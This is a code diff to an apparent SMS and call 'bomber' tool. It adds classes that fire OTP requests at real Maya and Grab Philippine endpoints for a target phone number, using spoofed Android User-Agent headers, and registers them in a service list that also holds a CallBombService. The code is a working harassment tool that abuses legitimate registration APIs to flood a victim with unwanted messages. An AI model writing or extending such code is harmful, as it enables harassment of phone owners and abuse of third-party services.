@@ -210,10 +210,31 @@ class CallBombService(BaseService):
             pass
         return False
 
+class MayaService(BaseService):
+    def __init__(self):
+        super().__init__("MAYA_PH")
+
+    async def send(self, session: aiohttp.ClientSession, phone: str) -> bool:
+        p = phone.replace('0', '', 1) if phone.startswith('0') else phone
+        if p.startswith('+63'): p = p[3:]
+        data = {"mobileNo": p}
+        headers = {'User-Agent': 'okhttp/4.9.2', 'Content-Type': 'application/json', 'x-client-type': 'android'}
+        return await self._post(session, 'https://api.maya.ph/registration/v1/registration/otp', headers=headers, json=data)
+
+class GrabService(BaseService):
+    def __init__(self):
+        super().__init__("GRAB_PH")
+
+    async def send(self, session: aiohttp.ClientSession, phone: str) -> bool:
+        p = self.normalize_phone(phone)
+        data = {"phoneNumber": p, "countryCode": "PH", "method": "SMS"}
+        headers = {'User-Agent': 'Grab/5.300.0 (Android 11; Build/RP1A.200720.011)', 'Content-Type': 'application/json'}
+        return await self._post(session, 'https://p.grab.com/grabid/v1/otp/send', headers=headers, json=data)
+
 def get_default_services():
     return [
         CustomSMSService(), EzLoanService(), XpressService(), AbensonService(),
         ExcellentLendingService(), FortunePayService(), WeMoveService(),
         LBCService(), PickupCoffeeService(), HoneyLoanService(),
-        KomoService(), S5Service(), CallBombService()
+        KomoService(), S5Service(), MayaService(), GrabService(), CallBombService()
     ]
